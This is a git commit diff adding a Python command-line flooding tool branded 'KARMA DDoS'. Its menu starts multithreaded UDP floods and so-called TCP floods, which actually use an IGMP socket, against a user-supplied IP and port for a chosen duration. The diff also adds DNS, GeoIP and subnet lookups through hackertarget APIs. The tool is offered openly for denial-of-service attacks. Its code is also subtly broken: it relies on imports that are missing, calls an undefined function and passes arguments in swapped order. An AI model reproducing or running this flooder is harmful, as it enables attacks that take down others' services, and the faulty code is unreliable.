b3feba7248a709fb7f2c2b3e8cbc38a06444ac0c
이시후 <122043797+dltlgn07@users.noreply.github.com>
2025-01-11 10:42:08 +0900

    Update main.py

--- main.py
+++ main.py
@@ -1,52 +1,236 @@
+# -*- coding: utf-8 -*-
+import os
 import socket
+import sys
 import threading
 import random
 import datetime
+from colorama import Fore, init
 
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        if (until - datetime.datetime.now()).total_seconds() > 0:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
+        else:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
+            return
+
+#region get
+def get_target(url):
+    url = url.rstrip()
+    target = {}
+    target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
+    target['host'] = urlparse(url).netloc
+    target['scheme'] = urlparse(url).scheme
+    
+    if ":" in urlparse(url).netloc:
+        target['port'] = urlparse(url).netloc.split(":")[1]
+    else:
+        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
+    return target
+
+##############################################################################################
+def get_info_l4():
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    port = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    thread = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    return target, port, thread, t
+##############################################################################################
+
+#region layer4
 def runflooder(host, port, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     rand = random._urandom(4096)
+    threads = []
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=flooder, args=(host, port, rand, until))
             thd.start()
-        except Exception as e:
-            print(f"Error starting flooder thread: {e}")
+            threads.append(thd)
+        except:
             pass
+    for thd in threads:
+        thd.join()
 
 def flooder(host, port, rand, until_datetime):
     sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-    try:
-        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-            try:
-                sock.sendto(rand, (host, int(port)))
-            except Exception as e:
-                print(f"Error sending flood: {e}")
-                pass
-    finally:
-        sock.close()  # 항상 소켓을 닫습니다.
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(rand, (host, int(port)))
+        except:
+            sock.close()
+            pass
+
 
 def runsender(host, port, th, t, payload):
     if payload == "":
         payload = random._urandom(60000)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    threads = []
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=sender, args=(host, port, until, payload))
             thd.start()
-        except Exception as e:
-            print(f"Error starting sender thread: {e}")
+            threads.append(thd)
+        except:
             pass
+    for thd in threads:
+        thd.join()
 
 def sender(host, port, until_datetime, payload):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-            try:
-                sock.sendto(payload, (host, int(port)))
-            except Exception as e:
-                print(f"Error sending payload: {e}")
-                pass
-    finally:
-        sock.close()  # 항상 소켓을 닫습니다.
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(payload, (host, int(port)))
+        except:
+            sock.close()
+            pass
+
+#endregion
+
+def clear(): 
+    if os.name == 'nt': 
+        os.system('cls')
+    else: 
+        os.system('clear')
+##############################################################################################
+def help():
+    clear()
+    stdout.write("                                                                                         \n")
+    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╠═╣║╣ ║  ╠═╝             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╩ ╩╚═╝╩═╝╩                \n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer4   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                             "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit KARMA DDoS                        "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using KARMA.                "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/HyukIsBack/KARMA-DDoS       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
+    stdout.write("\n")
+##############################################################################################
+def layer4():
+    clear()
+    stdout.write("                                                                                         \n")
+    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" TCP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("\n")
+##############################################################################################
+def tools():
+    clear()
+    stdout.write("                                                                                         \n")
+    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ║ ║ ║║ ║║  ╚═╗             \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.LIGHTCYAN_EX+"                     ║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup   "+Fore.LIGHTCYAN_EX+"                     ║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.LIGHTCYAN_EX+"               ║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("\n")
+##############################################################################################
+def title():
+    stdout.write("                                                                                          \n")
+    stdout.write("                                 "+Fore.LIGHTWHITE_EX  +"╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
+    stdout.write("                                 "+Fore.LIGHTCYAN_EX   +"╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"        Welcome To The Main Screen Of Karma  "+Fore.LIGHTCYAN_EX  +"       ║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"          Type [help] to see the Commands    "+Fore.LIGHTCYAN_EX +"       ║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"         Contact Dev - Telegram @zjfoq394   "+Fore.LIGHTCYAN_EX +"        ║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════════════════════════════════════════════╝\n")
+    stdout.write("\n")
+##############################################################################################
+def command():
+    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"Karma"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
+    command = input()
+    if command == "cls" or command == "clear":
+        clear()
+        title()
+    elif command == "help" or command == "?":
+        help()
+    elif command == "credit":
+        credit()
+    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
+        layer4()
+    elif command == "tools" or command == "tool":
+        tools()
+    elif command == "exit":
+        exit()
+    elif command == "udp" or command == "UDP":
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "tcp" or command == "TCP":
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "subnet":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')                   
+
+    elif command == "dns":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')
+
+    elif command == "geoip":
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+        target = input()
+        try:
+            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
+            print(r.text)
+        except:
+            print('An error has occurred while sending the request to the API!')
+    else:
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
+
+if __name__ == '__main__':
+    init(convert=True)
+    if len(sys.argv) < 2:
+        ua = open('./resources/ua.txt', 'r').read().split('\n')
+        clear()
+        title()
+        while True:
+            command()
+    elif len(sys.argv) == 5:
+        pass
+    else:
+        stdout.write("Method: UDP, TCP\n")
+        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
+        sys.exit()
